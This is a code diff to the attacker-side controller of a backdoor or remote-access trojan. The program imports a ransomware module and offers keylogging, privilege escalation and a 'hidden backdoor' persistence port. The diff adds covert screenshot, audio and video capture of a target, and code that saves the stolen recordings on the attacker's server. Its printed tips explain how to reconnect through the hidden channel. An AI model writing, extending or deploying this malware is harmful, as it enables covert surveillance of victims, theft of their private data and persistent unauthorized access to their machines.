@@ -7,6 +7,8 @@
 import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
 import os  # This library allows interaction with the operating system.
+import base64  # For decoding image/audio data
+import datetime  # For timestamps
 
 from features.ransomware_server import create_ransomware_server
 
@@ -82,15 +84,20 @@ def target_communication():
     print("")
     print("RECORDING COMMANDS:")
     print("   screenshot             - Take screenshot")
-    print("   start_recording        - Start audio/video surveillance")
-    print("   stop_recording         - Stop surveillance")
+    print("   start_audio            - Start audio recording only")
+    print("   stop_audio             - Stop audio recording")
+    print("   start_video            - Start video recording only")
+    print("   stop_video             - Stop video recording")
+    print("   start_recording        - Start both audio & video")
+    print("   stop_recording         - Stop both audio & video")
     print("   list_recordings        - List recorded files")
     print("")
-    print("PERSISTENCE COMMANDS:")
-    print("   start_persist          - Start persistence channel")
-    print("   stop_persist           - Stop persistence channel")
+    print("PERSISTENCE COMMANDS (Hidden Backdoor Channel):")
+    print("   start_persist          - Start hidden persistence channel")
+    print("   stop_persist           - Stop persistence channel")  
     print("   persist_status         - Get persistence status")
     print("   persist_info           - Show detailed connection info")
+    print("   💡 PERSISTENCE = Hidden port that stays open even if main backdoor dies")
     print("")
     print("[NOT WORKING] PRIVILEGE ESCALATION:")
     print("   check_privs            - Check current privileges")
@@ -157,32 +164,146 @@ def target_communication():
                 print(f"Keylog Data:\n{'-'*40}")
                 print(result)
                 print("-"*40)
-        elif command in ['screenshot', 'start_recording', 'stop_recording', 'list_recordings']:
+        elif command in ['screenshot', 'start_audio', 'stop_audio', 'staaudio', 'stop_audio', 'start_video', 'stop_video', 'start_rt_video', 'stop_video', 'start_recording', 'stop_recording', 'recording_status', 'list_recordings']:
             # Handle recording commands
             result = reliable_recv()
             if command == 'screenshot':
-                print(f"Screenshot: {result}")
-            elif command == 'start_recording':
+                if isinstance(result, dict) and result.get('action') == 'screenshot':
+                    # Save screenshot to server
+                    import base64
+                    import os
+                    
+                    # Create recordings directory if it doesn't exist
+                    recordings_dir = "recordings"
+                    if not os.path.exists(recordings_dir):
+                        os.makedirs(recordings_dir)
+                    
+                    # Decode and save image
+                    image_data = base64.b64decode(result['data'])
+                    filepath = os.path.join(recordings_dir, result['filename'])
+                    
+                    with open(filepath, 'wb') as f:
+                        f.write(image_data)
+                    
+                    print(f"Screenshot saved to: {filepath} ({result['size']} bytes)")
+                else:
+                    print(f"Screenshot: {result}")
+            elif command in ['start_audio', 'start_video', 'start_recording']:
                 print(f"Recording: {result}")
+            elif command == 'stop_audio':
+                if isinstance(result, dict) and result.get('action') == 'audio':
+                    # Save audio file to server
+                    import base64
+                    import os
+                    
+                    recordings_dir = "recordings"
+                    if not os.path.exists(recordings_dir):
+                        os.makedirs(recordings_dir)
+                    
+                    audio_data = base64.b64decode(result['data'])
+                    audio_path = os.path.join(recordings_dir, result['filename'])
+                    
+                    with open(audio_path, 'wb') as f:
+                        f.write(audio_data)
+                    
+                    print(f"Audio saved to: {audio_path} ({result['size']} bytes)")
+                else:
+                    print(f"Audio: {result}")
+            elif command == 'stop_video':
+                if isinstance(result, dict) and result.get('action') == 'video':
+                    # Save video file to server
+                    import base64
+                    import os
+                    
+                    recordings_dir = "recordings"
+                    if not os.path.exists(recordings_dir):
+                        os.makedirs(recordings_dir)
+                    
+                    video_data = base64.b64decode(result['data'])
+                    video_path = os.path.join(recordings_dir, result['filename'])
+                    
+                    with open(video_path, 'wb') as f:
+                        f.write(video_data)
+                    
+                    print(f"Video saved to: {video_path} ({result['size']} bytes)")
+                else:
+                    print(f"Video: {result}")
             elif command == 'stop_recording':
-                print(f"Recording: {result}")
+                if isinstance(result, dict) and result.get('action') == 'recording':
+                    # Save audio and video files to server
+                    import base64
+                    import os
+                    
+                    recordings_dir = "recordings"
+                    if not os.path.exists(recordings_dir):
+                        os.makedirs(recordings_dir)
+                    
+                    saved_files = []
+                    
+                    # Save audio if available
+                    if result.get('audio_data'):
+                        audio_data = base64.b64decode(result['audio_data'])
+                        audio_path = os.path.join(recordings_dir, result['audio_filename'])
+                        with open(audio_path, 'wb') as f:
+                            f.write(audio_data)
+                        saved_files.append(f"Audio: {audio_path} ({result['audio_size']} bytes)")
+                    
+                    # Save video if available
+                    if result.get('video_data'):
+                        video_data = base64.b64decode(result['video_data'])
+                        video_path = os.path.join(recordings_dir, result['video_filename'])
+                        with open(video_path, 'wb') as f:
+                            f.write(video_data)
+                        saved_files.append(f"Video: {video_path} ({result['video_size']} bytes)")
+                    
+                    if saved_files:
+                        print(f"Recording files saved:\n" + "\n".join(saved_files))
+                    else:
+                        print("No recording data received")
+                else:
+                    print(f"Recording: {result}")
             elif command == 'list_recordings':
-                print(f"Recordings:\n{result}")
+                # List recordings from server directory
+                import os
+                recordings_dir = "recordings"
+                if os.path.exists(recordings_dir):
+                    files = os.listdir(recordings_dir)
+                    if files:
+                        print(f"Recordings on server ({len(files)} files):")
+                        for filename in sorted(files):
+                            filepath = os.path.join(recordings_dir, filename)
+                            size = os.path.getsize(filepath)
+                            print(f"  - {filename} ({size} bytes)")
+                    else:
+                        print("No recordings found on server")
+                else:
+                    print("No recordings directory found on server")
+                
+                # Also show target response
+                print(f"\nTarget response: {result}")
         elif command in ['start_persist', 'stop_persist', 'persist_status', 'persist_info']:
             # Handle persistence commands
             result = reliable_recv()
             if command == 'start_persist':
-                print(f"Persistence: {result}")
+                print(f"🔒 PERSISTENCE CHANNEL STARTED:")
+                print(f"   {result}")
+                print(f"   📡 Hidden backdoor channel is now active!")
+                print(f"   🕳️  Even if main backdoor closes, you can still connect through this port")
+                print(f"   🔌 Use: telnet <target_ip> <port> to connect via persistence channel")
             elif command == 'stop_persist':
-                print(f"Persistence: {result}")
+                print(f"🔒 PERSISTENCE CHANNEL STOPPED:")
+                print(f"   {result}")
+                print(f"   🚫 Hidden channel has been terminated")
             elif command == 'persist_status':
-                print(f"Persistence Status:\n{'-'*40}")
+                print(f"🔒 PERSISTENCE STATUS:\n{'-'*50}")
                 print(result)
-                print("-"*40)
+                print("-"*50)
+                print(f"💡 TIP: If 'is_running: True' - you have a hidden backdoor active!")
             elif command == 'persist_info':
-                print(f"Persistence Info:\n{'-'*40}")
+                print(f"🔒 PERSISTENCE CONNECTION DETAILS:\n{'-'*50}")
                 print(result)
-                print("-"*40)
+                print("-"*50)
+                print(f"📊 This shows who has connected through your hidden channel")
         elif command in ['check_privs', 'escalate', 'privesc_report']:
             # Handle privilege escalation commands
             result = reliable_recv()
